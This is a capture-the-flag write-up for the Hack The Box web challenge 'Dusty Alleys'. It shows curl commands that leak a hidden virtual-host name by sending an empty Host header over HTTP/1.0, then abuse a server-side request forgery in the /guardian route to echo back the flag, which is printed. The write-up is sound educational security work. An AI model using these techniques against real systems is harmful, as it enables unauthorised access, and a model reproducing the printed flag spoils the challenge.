<h1 style="color:blue;">Dusty Alleys challenge</h1>

  Platform: Hack The Box
  
  Author: 0xL0m4
  
  Category: Web (Medium)
  
  <img width="1496" height="149" alt="image" src="https://github.com/user-attachments/assets/55b6769b-39ba-4765-8f77-a1547142f4dd" />



## Challenge Description: 
In the dark, dusty underground labyrinth, the survivors feel lost and their resolve weakens. Just as despair sets in, they notice a faint light: a dilapidated, rusty robot emitting feeble sparks. Hoping for answers, they decide to engage with it.
## Tools Used

  - Burp Suite
  - Curl
    
## Steps:

### 1. Download the source code and open the website
After downloading and reviewing the source code, I noticed that there are three routes alley, think, and guardian.

### 2. Testing the routes
I started by requesting alley --> it returns the index file.

Then, think --> it returns the request headers as JSON , which contain important information such as:
- host
- x-real-ip
- x-forwarded-for
  
And finally, guardian --> Not found . So, let's return to the code to know why it prevent us from accessing it.

In config/default.conf, there is an Nginx configuration.

there are two servers: 

- One for alley and think. It is used as the default server if there is no matching hostname in the Host header (this is an important point that we'll need later).
- Another one for guardian. It is not the default server and requires the correct hostname.
  
So, we must to get server name to access /gaurdian . 

the server name consists of two parts (guardian.$SECRET_ALLEY).

The second part is the same as first server name (alley.$SECRET_ALLEY). !!remember this!!

### 3. Understanding the vulnerability
There is a behavior in HTTP/1.0 where we can send a request without a Host header value, and Nginx will route it to the default server, as we can see in the configuration.

In HTTP/1.1, a Host header is required.

##### So, How do we exploit this information in our app?

- we have the think endpoint, and its role is returnig the request headers as json like host name. 
- So, What if we send an empty Host header and let the endpoint return the default server name in json respone.
- Let's get started...
  
We can use curl or Burp Suite.
  ```
  curl --http1.0 -H "Host:"  http://htb.htb:30394/think 
  ```
 The result: {"host":"alley.firstalleyontheleft.com",.....}

 <img width="1257" height="654" alt="image" src="https://github.com/user-attachments/assets/5ea8614d-b718-4516-86b7-ba84fcc665f2" />


### 4. Access Guardian endpoint
Host for alley (alley.$SECRET_ALLEY) --> alley.firstalleyontheleft.com

So, host for guardian (guardian.$SECRET_ALLEY) should be --> guardian.firstalleyontheleft.com

let's request the guardian endpoint...
```
curl -H "Host: guardian.firstalleyontheleft.com" "http://htb.htb:30394/guardian" -I     #-I for printing headers of the respone.
```
The result : 200 OK

<img width="1257" height="665" alt="image" src="https://github.com/user-attachments/assets/6ac773c1-c605-4f5a-b30b-7b7e4a698444" />

### 5. GET the flag
let's understand the guardian route well.
```
router.get("/guardian", async (req, res) => {
  const quote = req.query.quote;

  if (!quote) return res.render("guardian");

  try {
    const location = new URL(quote);
    const direction = location.hostname;
    if (!direction.endsWith("localhost") && direction !== "localhost")
      return res.send("guardian", {
        error: "You are forbidden from talking with me.",
      });
  } catch (error) {
    return res.render("guardian", { error: "My brain circuits are mad." });
  }

  try {
    let result = await node_fetch(quote, {
      method: "GET",
      headers: { Key: process.env.FLAG || "HTB{REDACTED}" },
    }).then((res) => res.text());

    res.set("Content-Type", "text/plain");

    res.send(result);
  } catch (e) {
    console.error(e);
    return res.render("guardian", {
      error: "The words are lost in my circuits",
    });
 }
});
```

There is quote parameter. 
If you don't send it , the guardian page loads normally.

If you send it:

  - the location becomes the URL that you provide.
  
  - the direction of location (http://direction:port) must end with localhost or be localhost.

  - the guardian route makes a GET request to the URL you provide and includes the flag inside a request header.

  - So, let's think quietly. We need an endpoint that returns request headers back to us for showing the flag. ---> that fits perfectly with think endpoint.

  - Okey, let's exploit it...
    
  ```
    curl -H "Host: guardian.firstalleyontheleft.com" "http://htb.htb:30394/guardian?quote=http://localhost:1337/think"   
  ```

Voilaaaa!!
The result: {"key":"HTB{DUsT_1n_my_3y3s_l33t}",....}

<img width="1255" height="636" alt="image" src="https://github.com/user-attachments/assets/09043237-b4d1-4079-a2c0-445dc8b6a3d2" />

    
### The flag: 

HTB{DUsT_1n_my_3y3s_l33t}
     
[The challenge link](https://app.hackthebox.com/challenges/Dusty%2520Alleys?tab=play_challenge)

See you in the next writeup!
 
سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.
